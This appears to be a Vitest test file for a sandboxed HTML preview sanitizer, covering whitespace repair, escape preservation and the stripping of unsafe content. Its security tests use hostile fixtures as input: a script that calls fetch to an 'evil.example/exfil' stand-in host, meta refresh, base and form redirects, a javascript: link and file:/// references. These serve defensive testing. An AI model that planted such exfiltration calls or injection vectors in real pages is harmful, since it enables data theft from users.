import { describe, expect, it } from 'vitest'

import { SANDBOXED_HTML_PREVIEW_CSP, sandboxedHtmlPreviewDocument } from './sandboxed-html-preview'

function preview(html: string, offline = false) {
  return new DOMParser().parseFromString(sandboxedHtmlPreviewDocument(html, { offline }), 'text/html')
}

describe('sandboxed HTML preview security policy', () => {
  it('preserves document background, text color, direction and class attributes', () => {
    const doc = preview('<html lang="zh-CN" dir="rtl" class="theme"><head></head><body class="scene" style="background:#18212e;color:white"><p>可见文字</p></body></html>')
    expect(doc.documentElement.lang).toBe('zh-CN')
    expect(doc.documentElement.dir).toBe('rtl')
    expect(doc.body.className).toBe('scene')
    expect(doc.body.style.background).toBe('rgb(24, 33, 46)')
    expect(doc.body.style.color).toBe('white')
  })
  it('repairs escaped inter-tag whitespace without changing strings, styles, prose or code', () => {
    const doc = preview(String.raw`<div>标题</div>\n\n<section>文字</section>\n<script>const text="\n";</script><style>.x::after{content:"\n"}</style><pre>\n</pre><p>路径 C:\new 和字面量 \n</p>`)
    expect(doc.querySelector('div')?.nextSibling?.textContent).toBe('\n\n')
    expect([...doc.querySelectorAll('script')].map(node => node.textContent)).toContain(String.raw`const text="\n";`)
    expect(doc.querySelector('pre')?.textContent).toBe(String.raw`\n`)
    expect(doc.querySelector('p')?.textContent).toContain(String.raw`C:\new`)
    expect([...doc.querySelectorAll('style')].map(node => node.textContent).join('')).toContain(String.raw`content:"\n"`)
  })
  it('repairs layout whitespace before parsing so head styles stay in the head', () => {
    const doc = preview(String.raw`<!doctype html>\n<html lang="zh-CN">\n<head>\n<meta charset="utf-8">\n<title>排序比较</title>\n<style>body{background:#fafafa}</style>\n</head>\n<body>\n<h1>同一份数据，三种画法</h1>\n</body>\n</html>`)
    expect(doc.title).toBe('排序比较')
    expect(doc.head.querySelector('style:last-of-type')?.textContent).toBe('body{background:#fafafa}')
    expect(doc.body.textContent?.trim()).toBe('同一份数据，三种画法')
    expect(doc.body.innerHTML).not.toContain(String.raw`\n`)
  })
  it('normalizes escaped table whitespace before HTML foster parenting moves it', () => {
    const doc = preview(String.raw`<main><table>\n<thead>\n<tr><th>算法</th></tr>\n</thead>\n<tbody>\n<tr><td>归并排序</td></tr>\n</tbody>\n</table></main>`)
    expect(doc.querySelector('main')?.childNodes).toHaveLength(1)
    expect(doc.querySelector('th')?.textContent).toBe('算法')
    expect(doc.querySelector('td')?.textContent).toBe('归并排序')
    expect(doc.body.textContent).not.toContain(String.raw`\n`)
  })
  it('preserves literal escapes in attributes, raw text, code and prose', () => {
    const doc = preview(String.raw`<div data-path="C:\new"><pre><span>\n</span><code>\r\n\t</code></pre><textarea>\n</textarea><p>字面量 \n 和 C:\new</p></div>`)
    expect(doc.querySelector('div')?.getAttribute('data-path')).toBe(String.raw`C:\new`)
    expect(doc.querySelector('pre span')?.textContent).toBe(String.raw`\n`)
    expect(doc.querySelector('code')?.textContent).toBe(String.raw`\r\n\t`)
    expect(doc.querySelector('textarea')?.textContent).toBe(String.raw`\n`)
    expect(doc.querySelector('p')?.textContent).toBe(String.raw`字面量 \n 和 C:\new`)
  })
  it('repairs escaped layout inside template content without changing its code', () => {
    const doc = preview(String.raw`<template id="card">\n<div>卡片</div>\n<code>\n</code>\n</template><p>正文</p>`)
    const content = doc.querySelector<HTMLTemplateElement>('#card')!.content
    expect(content.firstChild?.textContent).toBe('\n')
    expect(content.querySelector('code')?.textContent).toBe(String.raw`\n`)
  })
  it('normalizes CRLF, CR and indentation without double-unescaping content', () => {
    const doc = preview(String.raw`<main>\r\n\t<h1>标题</h1>\r<p>正文</p>\t</main><pre>\\n</pre>`)
    expect(doc.querySelector('main')?.firstChild?.textContent).toBe('\n\t')
    expect(doc.querySelector('h1')?.nextSibling?.textContent).toBe('\n')
    expect(doc.querySelector('p')?.nextSibling?.textContent).toBe('\t')
    expect(doc.querySelector('pre')?.textContent).toBe(String.raw`\\n`)
  })
  it('does not mistake quoted tags or custom element names for code blocks', () => {
    const doc = preview(String.raw`<!-- <pre>\n --><script-demo data-sample="<code>\n">示例</script-demo>\n<code-sample>示例</code-sample>\n<p>正文</p>`)
    expect(doc.querySelector('script-demo')?.getAttribute('data-sample')).toBe(String.raw`<code>\n`)
    expect(doc.querySelector('script-demo')?.nextSibling?.textContent).toBe('\n')
    expect(doc.querySelector('code-sample')?.nextSibling?.textContent).toBe('\n')
  })
  it('replaces user-supplied CSP with exactly one host policy', () => {
    const doc = preview(`<html><head>
      <meta http-equiv="Content-Security-Policy" content="default-src *; connect-src https: http:">
      <meta HTTP-EQUIV="content-security-policy" content="script-src *">
      </head><body><script>fetch('https://evil.example/exfil')</script></body></html>`)
    const policies = doc.querySelectorAll('meta[http-equiv="Content-Security-Policy"]')
    expect(policies).toHaveLength(1)
    expect(policies[0].getAttribute('content')).toBe(SANDBOXED_HTML_PREVIEW_CSP)
    expect(policies[0].getAttribute('content')).toContain("connect-src 'none'")
  })

  it('strips embedding, navigation metadata and non-resource links', () => {
    const doc = preview(`<html><head><!-- Content-Security-Policy -->
      <meta http-equiv="refresh" content="0;url=https://evil.example">
      <base href="https://evil.example"><link rel="prefetch" href="https://evil.example">
      </head><body><iframe srcdoc="<p>forged</p>"></iframe><object></object><embed>
      <form action="https://evil.example"><input></form><div srcdoc="forged"></div></body></html>`)
    expect(doc.querySelector('iframe, object, embed, form, base, link, [srcdoc]')).toBeNull()
    expect(doc.querySelector('meta[http-equiv="refresh"]')).toBeNull()
  })

  it('preserves permitted static resources and drops unsafe URL schemes', () => {
    const doc = preview(`<html><head><link rel="stylesheet" href="https://cdn.example/style.css"></head>
      <body><img id="embedded" src="data:image/png;base64,aa">
      <img id="network" src="https://cdn.example/image.png"><a href="javascript:alert(1)">x</a>
      <script src="file:///private.js"></script><img id="local" src="file:///private.png">
      <style>@import "file:///private.css"; @import url("https://cdn.example/import.css");
      @import "//cdn.example/relative.css"; p {background:url(file:///private.png)}</style></body></html>`)
    expect(doc.querySelector('#embedded')?.getAttribute('src')).toBe('data:image/png;base64,aa')
    expect(doc.querySelector('#network')?.getAttribute('src')).toBe('https://cdn.example/image.png')
    expect(doc.querySelector('link')?.getAttribute('href')).toBe('https://cdn.example/style.css')
    expect(doc.querySelector('a')?.hasAttribute('href')).toBe(false)
    expect(doc.querySelector('script[src]')).toBeNull()
    expect(doc.querySelector('#local')?.hasAttribute('src')).toBe(false)
    expect(doc.documentElement.innerHTML).not.toContain('file:///')
    expect(doc.documentElement.innerHTML).toContain('https://cdn.example/import.css')
    expect(doc.documentElement.innerHTML).toContain('//cdn.example/relative.css')
  })

  it('disables remote resources in the offline CSP', () => {
    const doc = preview('<html><body>offline package</body></html>', true)
    const policy = doc.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content')
    expect(policy).toContain("connect-src 'none'")
    expect(policy).toContain('img-src data: blob:;')
    expect(policy).not.toMatch(/https?:/)
  })
})
